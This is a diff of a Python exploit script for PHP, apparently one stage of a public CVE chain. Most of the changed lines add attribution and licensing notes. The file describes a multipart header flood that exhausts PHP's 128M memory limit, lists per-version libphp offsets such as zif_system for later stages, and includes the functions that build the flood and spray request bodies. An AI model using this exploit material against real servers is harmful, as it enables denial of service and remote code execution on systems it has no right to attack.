@@ -1,10 +1,20 @@
 #!/usr/bin/env python3
+# LANE: stock-128M multipart MIME header flood (adapted from WoYinDao
+# `tools/exploit_128m.py`, MIT, commit a127f77009ca; see
+# THIRD_PARTY_NOTICES.md). This is NOT the README stale-session-id chain
+# (A1 -> B1 -> A2 -> B2 on php.ini-production targets). The "2/2" figures
+# below are flood-lane arm results on official images with NO active php.ini,
+# which does not reproduce the public 8.4.26 chain. In this lane 8.4.26 and
+# 8.3.35 reached the upstream flood terminal; 8.5.11's 2/2 is A1+B1 leak only
+# (no `uid`, no `libphp` pointer), not a full chain.
 """producer_flood.py - stock-128M producer stage: multipart MIME header flood.
 
-Provenance: WoYinDao/CVE-2026-109618-CVSS-9.2-Critical @
-99da6fb7dd7ecd4a95cd7188d77bb7e7785012eb, `tools/exploit_128m.py` (the only
-public chain that OOMs the *stock* `memory_limit=128M` while staying under the
-stock `post_max_size=8M`). The amplifier is one multipart file part carrying N
+Provenance: adapted from WoYinDao/CVE-2026-109618-CVSS-9.2-Critical,
+`tools/exploit_128m.py` (MIT License, Copyright (c) 2026 WoYinDao), commit
+a127f77009ca; reviewed snapshot 99da6fb7dd7ecd4a95cd7188d77bb7e7785012eb.
+The full notice is in THIRD_PARTY_NOTICES.md. This is the only public chain
+that OOMs the *stock* `memory_limit=128M` while staying under the stock
+`post_max_size=8M`. The amplifier is one multipart file part carrying N
 lines of `X: v\\r\\n`: 6 bytes of wire per line cost PHP ~290-305 bytes in the
 multipart parser, so 500,000 lines = 3.00 MB of body exhaust 128 MB during
 request startup (pre-RINIT). The fatal prints as `... in Unknown on line 0`,
@@ -32,10 +42,14 @@ the stock image default, NOT a claim about hardened php.ini targets.
 
 Measured 2026-10-22 (receipt flood128_20261022T091656Z), single prefork worker,
 ASLR=2, official images, no php.ini:
-  version   zif_system  zval_ptr_dtor  htdata    full chain  one-shot
-  8.4.26    0x465370    0x65eb60       0x690d8   2/2         W3 attempt 1
-  8.3.35    0x3ac080    0x49ec50       0x6a0d8   2/2         W3 attempt 1
-  8.5.11    0x5996e0    0x7b47a0       0x690d8   2/2         W3 attempt 1
+  version   zif_system  zval_ptr_dtor  htdata    flood-lane 2/2        one-shot
+  8.4.26    0x465370    0x65eb60       0x690d8   2/2 (this lane)       W3 attempt 1
+  8.3.35    0x3ac080    0x49ec50       0x6a0d8   2/2 (this lane)       W3 attempt 1
+  8.5.11    0x5996e0    0x7b47a0       0x690d8   2/2 A1+B1 leak only   n/a (no libphp pointer)
+For 8.5.11, 2/2 means the A1 OOM plus the B1 819,208-B leak only: no
+target-written `uid` and no `libphp` pointer, so the upstream terminal cannot be
+driven. The no-active-php.ini condition is not the public README 8.4.26 chain
+(php.ini-production, stale-session-id A1 -> B1 -> A2 -> B2).
 Offsets are libphp.so-relative except htdata, which is the 2 MiB-chunk-relative
 offset of the first of the 15 live 167-byte fake-HashTable strings in the
 stage-3 B request (gdb scan of $_POST zend_strings on a fresh child after the
@@ -87,6 +101,8 @@ RECEIPT_PARITY = {
     "flood": "336d6b9a466f57bd80cf3af9f2c044c265eec5b038644e666a911ab68fae498f",
     "spray": "ac456eff9f3051b5714db2759c7ca7233593f502fa872278135b77c36d46a628",
 }
+# upstream commit cited for this adaptation is a127f77009ca; 99da6fb7 is the
+# reviewed snapshot recorded in the receipts below
 RECEIPT = {
     "upstream": "WoYinDao/CVE-2026-109618-CVSS-9.2-Critical@99da6fb7 "
                 "tools/exploit_128m.py",
@@ -142,7 +158,11 @@ def validate_variant(variant: str) -> str:
 
 
 def _multipart(parts: list[dict], boundary: bytes) -> bytes:
-    """Byte-exact copy of the upstream build_multipart (order/format)."""
+    """Adapted from the upstream build_multipart: same part order and formatting.
+
+    Upstream is `tools/exploit_128m.py` in WoYinDao/CVE-2026-109618-CVSS-9.2-Critical,
+    MIT, Copyright (c) 2026 WoYinDao; see THIRD_PARTY_NOTICES.md.
+    """
     out = bytearray()
     for part in parts:
         out += b"--" + boundary + b"\r\n"
@@ -159,7 +179,11 @@ def _multipart(parts: list[dict], boundary: bytes) -> bytes:
 
 def arm_body(header_count: int = DEFAULT_HEADER_COUNT,
              variant: str = "flood", sid: bytes = b"\x00") -> bytes:
-    """Build one upstream flood arm (flood = stage1 A, spray = rotate A)."""
+    """Build one flood arm shaped like upstream (flood = stage1 A, spray = rotate A).
+
+    The arm layout is adapted from the upstream builders (MIT, WoYinDao);
+    see THIRD_PARTY_NOTICES.md.
+    """
     validate_header_count(header_count)
     validate_variant(variant)
     if variant == "spray":
